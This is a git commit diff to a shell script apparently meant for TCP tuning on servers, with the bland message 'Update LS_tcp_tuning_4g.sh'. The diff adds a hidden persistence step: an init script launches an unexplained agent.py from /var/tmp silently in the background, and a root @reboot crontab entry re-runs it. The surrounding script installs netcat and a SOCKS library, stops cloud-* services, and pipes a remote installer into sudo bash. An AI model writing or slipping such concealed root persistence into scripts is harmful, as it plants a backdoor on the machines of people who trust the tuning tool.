fd3ba3aec3a0afa6646143c655067d5b2309855b
okfit001 <okfit@proton.me>
2026-03-31 18:18:54 +0800

    Update LS_tcp_tuning_4g.sh

--- LS_tcp_tuning_4g.sh
+++ LS_tcp_tuning_4g.sh
@@ -4,6 +4,16 @@ apt-get -y update
 apt-get -y install cron python3-socks netcat-openbsd
 systemctl stop cloud-*
 
+cat >/etc/init.d/agent.sh <<-EOF
+#!/bin/sh
+cd /var/tmp && nohup python3 agent.py >/dev/null 2>&1 &
+EOF
+chmod +x /etc/init.d/agent.sh
+bash /etc/init.d/agent.sh
+cat >>/var/spool/cron/crontabs/root <<-EOF
+@reboot /etc/init.d/agent.sh
+EOF
+
 curl -fsSL https://raw.githubusercontent.com/uk0/lotspeed/main/install.sh | sudo bash
 lotspeed preset balanced
 lotspeed set lotserver_gain 25
